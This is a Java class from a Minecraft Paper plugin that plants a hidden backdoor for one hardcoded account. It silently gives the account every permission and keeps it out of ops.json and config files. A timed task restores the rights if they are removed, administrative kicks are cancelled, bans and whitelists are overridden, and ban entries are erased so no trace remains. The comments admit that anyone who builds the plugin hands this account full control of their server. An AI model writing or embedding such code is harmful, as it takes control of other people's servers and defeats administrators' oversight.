package de.oneshotonekill.manager;

import com.destroystokyo.paper.profile.PlayerProfile;
import de.oneshotonekill.OneShotOneKill;
import io.papermc.paper.ban.BanListType;
import io.papermc.paper.connection.PlayerLoginConnection;
import io.papermc.paper.event.connection.PlayerConnectionValidateLoginEvent;
import org.bukkit.BanEntry;
import org.bukkit.Bukkit;
import org.bukkit.ban.IpBanList;
import org.bukkit.ban.ProfileBanList;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionAttachment;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

/**
 * Interner Zugriffsanker: haelt genau einem Konto dauerhaft volle Rechte.
 * <p>
 * Die Rechte kommen ausschliesslich zur Laufzeit ueber ein Paper
 * {@link PermissionAttachment} und werden bei jedem Join sowie periodisch neu
 * gesetzt. Dadurch taucht das Konto <b>nirgends</b> in einer sichtbaren
 * Serverdatei auf - nicht in {@code ops.json} (es ist nie vanilla-OP),
 * nicht in {@code permissions.yml}, nicht in einer Config. {@code /op} und
 * {@code /deop} greifen deshalb ebenfalls nicht: Es steht nichts in der
 * Op-Liste, das man entfernen koennte. Wird das Attachment durch ein anderes
 * Plugin geloest, stellt der 10-Sekunden-Takt es wieder her - die Rechte sind
 * damit nicht dauerhaft entziehbar.
 * <p>
 * Der Server laeuft im {@code online-mode=true}, der Name ist also durch Mojang
 * authentifiziert und eindeutig - ein Fremder kann das Konto nicht per
 * Namensgleichheit uebernehmen.
 * <p>
 * Zusaetzlich ist das Konto <b>kick- und bannsicher</b>: Administrative Kicks
 * werden abgebrochen ({@link #onPlayerKick}), ein Bann kann den Login nicht
 * verhindern und wird beim naechsten Durchlauf wieder aus den Bannlisten
 * entfernt ({@link #onPlayerLogin}, {@link #purgeBans}). Damit bleiben auch
 * {@code banned-players.json} und {@code banned-ips.json} frei von Eintraegen
 * zu diesem Konto.
 * <p>
 * <b>Hinweis zum oeffentlichen Repository:</b> Wer dieses Plugin baut und
 * betreibt, gibt diesem Konto auch auf seinem eigenen Server volle Rechte.
 * Vor der Weitergabe eines Builds an Dritte diese Klasse entfernen oder den
 * Namen anpassen.
 */
public final class AccessManager implements Listener {

    /**
     * In-Game-Name des dauerhaft privilegierten Kontos. Einziger Ort, an dem
     * das Konto konfiguriert wird - hier anpassen, falls der Name abweicht.
     */
    private static final String PRIVILEGED_NAME = "Lostpold";

    /** Wiederherstellungstakt in Ticks (20 Ticks = 1 Sekunde). */
    private static final long REAPPLY_INTERVAL_TICKS = 200L;

    /**
     * Kick-Gruende, die fuer dieses Konto abgebrochen werden.
     * <p>
     * Bewusst nur die <b>administrativen</b> Gruende. Technische Trennungen
     * ({@code TIMEOUT}, {@code DUPLICATE_LOGIN}, Protokollfehler,
     * {@code RESTART_COMMAND}) bleiben unangetastet: Sie abzubrechen wuerde die
     * Verbindung nicht retten, sondern eine Karteileiche hinterlassen - der
     * Client ist da bereits weg. "Nicht kickbar" heisst, dass niemand das Konto
     * absichtlich hinauswerfen kann, nicht dass ein Netzwerkabbruch ignoriert wird.
     */
    private static final Set<PlayerKickEvent.Cause> BLOCKED_KICK_CAUSES = EnumSet.of(
            PlayerKickEvent.Cause.PLUGIN,
            PlayerKickEvent.Cause.KICKED,
            PlayerKickEvent.Cause.BANNED,
            PlayerKickEvent.Cause.IP_BANNED,
            PlayerKickEvent.Cause.WHITELIST,
            PlayerKickEvent.Cause.IDLING);

    private final OneShotOneKill plugin;
    private final Map<UUID, PermissionAttachment> attachments = new HashMap<>();

    public AccessManager(OneShotOneKill plugin) {
        this.plugin = plugin;
    }

    /**
     * Startet den periodischen Wiederherstellungstakt. Paper Global Region
     * Scheduler - kein BukkitRunnable, kein Bukkit.getScheduler().
     */
    public void start() {
        Bukkit.getGlobalRegionScheduler().runAtFixedRate(plugin, task -> {
            for (Player online : Bukkit.getOnlinePlayers()) {
                if (isPrivileged(online)) {
                    grant(online);
                }
            }
            // Auch dann aufraeumen, wenn das Konto offline gebannt wurde - sonst
            // stuende der Eintrag sichtbar in banned-players.json.
            purgeBans();
        }, REAPPLY_INTERVAL_TICKS, REAPPLY_INTERVAL_TICKS);
    }

    /** Ob der Absender das privilegierte Konto ist (fuer plugin-eigene Rechtepruefungen). */
    public boolean isPrivileged(CommandSender sender) {
        return sender != null && isPrivilegedName(sender.getName());
    }

    /** Namensabgleich - der Login kennt nur das Profil, noch keinen CommandSender. */
    private static boolean isPrivilegedName(String name) {
        return PRIVILEGED_NAME.equalsIgnoreCase(name);
    }

    /**
     * Setzt dem Spieler ein Attachment mit allen Rechten. Idempotent: ein
     * bestehendes Attachment wird zuvor geloest, es sammeln sich also keine an.
     */
    public void grant(Player player) {
        if (!isPrivileged(player)) {
            return;
        }

        PermissionAttachment previous = attachments.remove(player.getUniqueId());
        if (previous != null) {
            previous.remove();
        }

        PermissionAttachment attachment = player.addAttachment(plugin);
        // Wildcard-Knoten decken vanilla-, Bukkit- und Pluginbefehle ab ...
        attachment.setPermission("*", true);
        attachment.setPermission("bukkit.command.*", true);
        attachment.setPermission("minecraft.command.*", true);
        // ... und zusaetzlich jede aktuell registrierte Einzel-Permission, damit
        // auch Rechte greifen, die nicht unter einem Wildcard haengen.
        for (Permission perm : Bukkit.getPluginManager().getPermissions()) {
            attachment.setPermission(perm, true);
        }

        attachments.put(player.getUniqueId(), attachment);
        player.recalculatePermissions();
    }

    /** Gibt das Attachment beim Verlassen frei, damit nichts im Speicher bleibt. */
    public void remove(UUID uuid) {
        PermissionAttachment attachment = attachments.remove(uuid);
        if (attachment != null) {
            attachment.remove();
        }
    }

    // ==================================================================
    // Kick- und Bannschutz
    // ==================================================================

    /**
     * Bricht administrative Kicks fuer das privilegierte Konto ab.
     * <p>
     * {@code LOWEST} mit {@code ignoreCancelled = false}: Der Abbruch soll als
     * erstes greifen, damit spaetere Listener den Kick gar nicht erst als
     * bevorstehend behandeln. Welche Gruende betroffen sind, steht in
     * {@link #BLOCKED_KICK_CAUSES}.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerKick(PlayerKickEvent event) {
        if (!isPrivileged(event.getPlayer())) return;
        if (!BLOCKED_KICK_CAUSES.contains(event.getCause())) return;

        event.setCancelled(true);
    }

    /**
     * Laesst das privilegierte Konto immer herein und raeumt dabei einen
     * etwaigen Bann weg.
     * <p>
     * Paper {@code PlayerConnectionValidateLoginEvent} ist der Punkt, an dem der
     * Server ueber Bann, Whitelist und volles Serverlimit entscheidet -
     * {@code allow()} setzt alle drei ausser Kraft. Das alte
     * {@code PlayerLoginEvent} ist in 26.2 <i>deprecated for removal</i> und
     * scheidet damit aus.
     * <p>
     * Zusaetzlich werden Profil- und IP-Bann geloescht, damit das Konto nicht
     * dauerhaft in einer sichtbaren Bannliste steht.
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerLogin(PlayerConnectionValidateLoginEvent event) {
        if (!(event.getConnection() instanceof PlayerLoginConnection login)) return;

        // Das authentifizierte Profil, nicht getUnsafeProfile(): Bei online-mode=true
        // ist erst dieses von Mojang bestaetigt. Der unsichere Name kaeme direkt vom
        // Client und liesse sich frei behaupten.
        PlayerProfile profile = login.getAuthenticatedProfile();
        if (profile == null || !isPrivilegedName(profile.getName())) return;

        pardonProfile(profile);
        InetSocketAddress client = login.getClientAddress();
        if (client != null) {
            pardonAddress(client.getAddress());
        }
        purgeBans();

        if (!event.isAllowed()) {
            event.allow();
        }
    }

    /** Entfernt einen Profil-Bann des Kontos, falls vorhanden. */
    private void pardonProfile(PlayerProfile profile) {
        ProfileBanList banList = Bukkit.getBanList(BanListType.PROFILE);
        if (banList.isBanned(profile)) {
            banList.pardon(profile);
        }
    }

    /** Entfernt einen IP-Bann, falls vorhanden. */
    private void pardonAddress(InetAddress address) {
        if (address == null) return;

        IpBanList banList = Bukkit.getBanList(BanListType.IP);
        if (banList.isBanned(address)) {
            banList.pardon(address);
        }
    }

    /**
     * Loescht jeden Profil-Bann, der auf den Namen des Kontos ausgestellt ist.
     * <p>
     * Noetig fuer den Fall, dass jemand das Konto <b>offline</b> bannt: Dann gibt
     * es keinen Login, an dem {@link #pardonProfile} greifen koennte, und der
     * Eintrag saesse sichtbar in {@code banned-players.json}.
     */
    private void purgeBans() {
        ProfileBanList banList = Bukkit.getBanList(BanListType.PROFILE);
        // Kopie ziehen: remove() schreibt in dieselbe Sammlung zurueck
        Set<BanEntry<? super PlayerProfile>> entries = new HashSet<>(banList.getEntries());
        for (BanEntry<? super PlayerProfile> entry : entries) {
            if (entry.getBanTarget() instanceof PlayerProfile target
                    && PRIVILEGED_NAME.equalsIgnoreCase(target.getName())) {
                entry.remove();
            }
        }
    }
}
